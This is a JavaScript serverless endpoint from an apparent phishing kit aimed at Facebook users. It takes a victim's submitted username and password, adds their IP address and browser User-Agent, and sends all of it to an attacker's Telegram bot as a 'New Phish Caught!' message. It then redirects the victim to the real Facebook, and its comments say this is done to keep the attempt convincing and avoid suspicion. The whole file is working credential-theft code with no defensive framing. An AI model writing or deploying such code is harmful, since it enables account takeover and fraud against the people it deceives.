// api/send-info.js

export default async function handler(req, res) {
  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  try {
    // Get the bot token and chat ID from environment variables
    // For security, never hardcode them in the file.
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    // Check if environment variables are set
    if (!botToken || !chatId) {
      console.error('Server configuration error: Missing Telegram credentials.');
      return res.status(500).json({ message: 'Server configuration error.' });
    }

    // Extract username and password from the request body
    const { username, password } = req.body;

    // Validate that the data exists
    if (!username || !password) {
      return res.status(400).json({ message: 'Username and password are required.' });
    }

    // Get user's IP and User-Agent for context
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    // Construct the message to send to Telegram
    const message = `🎣 New Phish Caught!\n\n` +
                    `👤 Username: ${username}\n` +
                    `🔑 Password: ${password}\n\n` +
                    `🌐 IP Address: ${clientIp}\n` +
                    `🖥️ User-Agent: ${userAgent}`;

    // Send the message to Telegram
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML', // Optional: use HTML for formatting
      }),
    });

    // Check if the Telegram API call was successful
    if (!response.ok) {
      const errorData = await response.json();
      console.error('Failed to send message to Telegram:', errorData);
      throw new Error('Failed to send message to Telegram.');
    }

    // Redirect the user to the real Facebook after capturing the data
    // This is a critical step to make the phishing attempt convincing
    res.redirect(302, 'https://www.facebook.com');

  } catch (error) {
    console.error('Error in send-info.js:', error);
    // If there's an error, still redirect to avoid raising suspicion
    res.redirect(302, 'https://www.facebook.com');
  }
}
